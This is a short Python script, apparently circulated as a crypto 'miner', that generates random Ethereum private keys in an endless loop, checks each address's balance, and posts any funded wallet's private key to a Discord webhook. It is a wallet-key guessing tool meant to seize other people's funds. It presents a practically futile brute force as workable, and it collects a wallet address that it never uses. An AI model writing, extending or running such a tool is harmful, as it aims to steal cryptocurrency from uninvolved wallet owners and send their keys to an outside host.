import requests
from web3 import Account, Web3
from eth_account import Account as LocalAccount
from discord_webhook import DiscordWebhook
import os 

privinput = input('Enter Your Webhook: ')
eth = input('Enter Your Wallet Adress: ')
privky = privinput
webhook = DiscordWebhook(url=privky, content='Bot is working **Coded by EtheriumMiner**')
webhook.execute()

while True:
    private_key = LocalAccount.create().key.hex()[2:]
    address = Account.from_key(private_key).address

    
    w3 = Web3(Web3.HTTPProvider('https://rpc.ankr.com/eth'))
    wallet_address = address
    balance_wei = w3.eth.get_balance(wallet_address)
    balance_eth = w3.fromWei(balance_wei, 'ether')


    if balance_eth > 0:
        message = f"Private key: {private_key}\nAddress: {address}\nBalance: {balance_eth} ETH"
        webhook = DiscordWebhook(url=privky, content=message)
        webhook.execute()
        print(message)


        data = {"content": message}
        headers = {"Content-Type": "application/json"}
        response = requests.post(privky, json=data, headers=headers)

        break
    else:
        print(f"Private key: {private_key}")
        print(f"Balance: {balance_eth} ETH")